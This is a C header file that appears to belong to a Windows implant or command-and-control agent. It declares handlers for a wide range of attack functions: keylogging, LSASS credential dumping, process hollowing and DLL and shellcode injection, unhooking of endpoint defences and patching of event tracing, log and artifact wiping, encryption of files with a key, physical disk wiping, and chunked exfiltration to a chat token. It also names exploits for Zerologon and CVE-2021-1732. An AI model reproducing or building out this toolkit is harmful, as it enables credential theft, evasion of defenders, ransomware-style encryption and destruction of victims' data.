/*
 * commands.h — command dispatch + forward declarations for all C modules
 */
#pragma once
#include <windows.h>
#include <stddef.h>

/* ── Wire-protocol task ────────────────────────────────────────────────────── */
typedef struct {
    char *id;        /* unique task UUID    */
    char *command;   /* exec/ps/download/…  */
    char *args_json; /* raw args JSON object */
} Task;

void  task_free(Task *t);

/*
 * cmd_dispatch — run the task, return heap-allocated result string.
 * Caller must free() the returned string.
 */
char *cmd_dispatch(const Task *t);

/* ── Built-in command handlers ─────────────────────────────────────────────── */

/* In-process BOF (COFF) execution — no child process, no PowerShell */
BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
                char *args, int args_len,
                char **out_buf, SIZE_T *out_len);

char *cmd_exec(const char *cmdline);
char *cmd_ps(const char *expression);
char *cmd_screenshot(void);
char *cmd_download(const char *path);
char *cmd_upload(const char *path, const char *b64_data);
char *cmd_keylogger(const char *action);
char *cmd_wipe_artifacts(void);
char *cmd_disk_disrupt(void);
char *cmd_etw_patch(void);
char *cmd_process_hollow(const char *target, const char *sc_b64);
char *cmd_chunked_send(const char *path, int chunk_mb,
                       const char *token, const char *chat_id);
char *cmd_encrypt_files(const char *root, const char *ext,
                        const char *key_hex);
char *cmd_timestomp(const char *source, const char *target);
char *cmd_mem_patch(const char *addr_hex, const char *patch_b64);
char *cmd_rdi_inject(DWORD pid, const char *dll_b64);
char *cmd_dll_inject(const char *dll_b64);
char *cmd_execute_assembly(const char *asm_b64, const char *arguments);

/* ── SMB pivot helpers ─────────────────────────────────────────────────────── */
char *cmd_pivot_listen(const char *pipe_suffix_utf8);
char *cmd_pivot_connect(const char *full_pipe_utf8);
char *cmd_pivot_send(uint32_t agent_id, const char *data_b64);

/* ── SOCKS5 proxy ──────────────────────────────────────────────────────────── */
char *cmd_socks_start(int port);
char *cmd_socks_stop(void);
char *cmd_socks_poll(void);

/* ── LSASS dump (nanodump adapter, syscall-based, no MiniDumpWriteDump) ────── */
char *cmd_lsass_dump(const char *out_path);

/* ── KaynLdr shellcode injection (Cracked5pider, MIT) ───────────────────── */
char *cmd_shellcode_inject(DWORD pid, const char *sc_b64);

/* ── Process Ghosting PE execution (hasherezade technique) ──────────────── */
char *cmd_ghost_inject(const char *pe_b64, const char *cmdline, DWORD parent_pid);

/* ── Token impersonation (Havoc/Sliver-derived) ────────────────────────────── */
/* Source: HavocFramework/Havoc Token.c (MIT) + BishopFox/sliver priv_windows.go (MIT) */
#include "../../fitnah/implant/token/token.h"

/* ── syscall/direct_syscall.c ──────────────────────────────────────────────── */
#include <winternl.h>
BOOL      Syscall_Initialize(void);
VOID      Syscall_Cleanup(void);
NTSTATUS  Syscall_NtAllocateVirtualMemory(HANDLE ProcessHandle,
              PVOID *BaseAddress, ULONG_PTR ZeroBits,
              PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS  Syscall_NtProtectVirtualMemory(HANDLE ProcessHandle,
              PVOID *BaseAddress, PSIZE_T RegionSize,
              ULONG NewProtect, PULONG OldProtect);

/* ── injection/rdi_loader.c ───────────────────────────────────────────────── */
/* ReflectiveDllInjection — load a DLL from memory into a remote process */
BOOL RDI_Inject(HANDLE hProcess, LPVOID pDllBuffer, SIZE_T dwDllSize);

/* ── injection/code_cave.c ────────────────────────────────────────────────── */
typedef struct _CODE_CAVE       CODE_CAVE;
typedef struct _CAVE_SEARCH_PARAMS CAVE_SEARCH_PARAMS;
BOOL FindCodeCaves(DWORD ProcessId, CODE_CAVE **ppCaves, DWORD *pCaveCount,
                   CAVE_SEARCH_PARAMS *pParams);
BOOL InjectIntoCodeCave(DWORD ProcessId, CODE_CAVE *pCave,
                        LPVOID pPayload, SIZE_T PayloadSize);
BOOL CleanupCodeCaveInjection(DWORD ProcessId, CODE_CAVE *pCave,
                              LPVOID pOriginalBytes, SIZE_T OriginalSize);

/* ── injection/process_mirror.c ──────────────────────────────────────────── */
BOOL MirrorProcess(DWORD ParentPid, DWORD *pChildPid);

/* ── process_hollowing.c ──────────────────────────────────────────────────── */
BOOL ProcessHollowing(LPCSTR szTargetPath, LPVOID pPayload, DWORD dwPayloadSize);

/* ── reflective_loader.c ──────────────────────────────────────────────────── */
BOOL ReflectiveLoadDLL(LPVOID pData, DWORD dwDataLen, LPVOID *ppDllBuffer);

/* ── evasion/memory_patcher.c ─────────────────────────────────────────────── */
typedef struct _MEMORY_PATCH MEMORY_PATCH;
BOOL   InitializeSyscallTable(void);
DWORD  GetSyscallNumber(LPCSTR functionName);
LPVOID AllocateMemoryEx(SIZE_T size, ULONG protect);
BOOL   ProtectMemoryEx(LPVOID address, SIZE_T size,
                       ULONG newProtect, PULONG oldProtect);
BOOL   WriteMemoryEx(HANDLE hProcess, LPVOID address,
                     LPCVOID buffer, SIZE_T size);
LPVOID CreateTrampoline(LPVOID targetAddress, LPVOID hookAddress,
                        PSIZE_T trampolineSize);
BOOL   RemoveMemoryPatch(PMEMORY_PATCH patch);
DWORD  RemoveAllPatches(void);
BOOL   RemoveEdrHooks(void);

/* ── evasion/unhook.c ─────────────────────────────────────────────────────── */
BOOL UnhookNtdll(void);

/* ── evasion/anti_analysis.c ──────────────────────────────────────────────── */
BOOL Timestomp(LPCSTR szSourcePath, LPCSTR szTargetPath);
VOID ErasePeHeaders(void);
VOID UnlinkFromPeb(void);
VOID PatchEventLog(void);

/* ── evasion/sleep_obfuscation.c ──────────────────────────────────────────── */
VOID ObfuscatedSleep(DWORD dwMilliseconds);   /* XOR self-encrypt while sleeping */
VOID AdvancedEkkoSleep(DWORD dwMilliseconds); /* Timer-queue variant (Ekko-like)  */

/* ── collection/lsass_dump.c ──────────────────────────────────────────────── */
BOOL EnablePrivilege(LPCSTR lpPrivilegeName);
DWORD GetLsassPid(void);
BOOL DumpLsass(LPCSTR szDumpPath);

/* ── exploits/cve_exploits.c ──────────────────────────────────────────────── */
BOOL Exploit_CVE_2021_1732(void);
BOOL Exploit_Zerologon(LPCWSTR szTargetDC);

/* ── impact/artifact_wipe.c ───────────────────────────────────────────────── */
BOOL ClearEventLogs(void);
BOOL WipeJumpLists(void);
BOOL WipeBrowserHistory(void);
BOOL PurgeRecycleBin(void);
BOOL WipeRegistryArtifacts(void);
void ArtifactWipe_ExecuteAll(void);

/* ── impact/disk_wipe.c ───────────────────────────────────────────────────── */
BOOL WipePhysicalDrive(int driveNumber);
BOOL CorruptBCD(void);
BOOL DeleteShadowCopiesCOM(void);
void DiskWipe_Disrupt(void);
